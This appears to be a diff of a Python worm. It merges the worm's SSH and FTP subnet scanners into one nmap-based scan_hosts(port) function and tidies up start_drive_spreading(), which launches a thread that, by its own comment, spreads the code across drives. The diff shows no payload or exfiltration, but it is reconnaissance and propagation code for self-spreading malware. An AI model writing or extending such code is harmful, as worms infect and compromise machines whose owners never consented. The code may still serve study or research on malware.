@@ -33,40 +33,21 @@ coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
 gws = netifaces.gateways()
 gateway = gws['default'][netifaces.AF_INET][0]
 
-def scan_ssh_hosts():
+def scan_hosts(port):
     """
     Scans all machines on the same network that
      have SSH (port 22) enabled
-
     Returns:
         IP addresses of hosts
     """
-    logger.debug("Scanning machines on the same network with port 22 open.")
+    logger.debug(f"Scanning machines on the same network with port {port} open.")
 
 
     logger.debug("Gateway: " + gateway)
 
     port_scanner = nmap.PortScanner()
-    port_scanner.scan(gateway + "/24", arguments='-p 22 --open')
+    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')
 
-    all_hosts = port_scanner.all_hosts()
-
-    logger.debug("Hosts: " + str(all_hosts))
-    return all_hosts
-
-
-def scan_ftp_hosts():
-    """
-    Scans all machines on the same network that
-     have FTP (port 21) enabled
-
-    Returns:
-        IP addresses of hosts
-    """
-    logger.debug("Scanning machines on the same network with port 21 open.")
-
-    port_scanner = nmap.PortScanner()
-    port_scanner.scan(gateway + '/24', arguments='-p 21 --open')
     all_hosts = port_scanner.all_hosts()
 
     logger.debug("Hosts: " + str(all_hosts))
@@ -182,9 +163,7 @@ def start_drive_spreading():
     # This means that the code will spread on drives and execute other functions at the same time.
     thread = Thread(target = drivespreading)
     thread.start()
-
-
-
+    
 def main():
     start_drive_spreading()
 
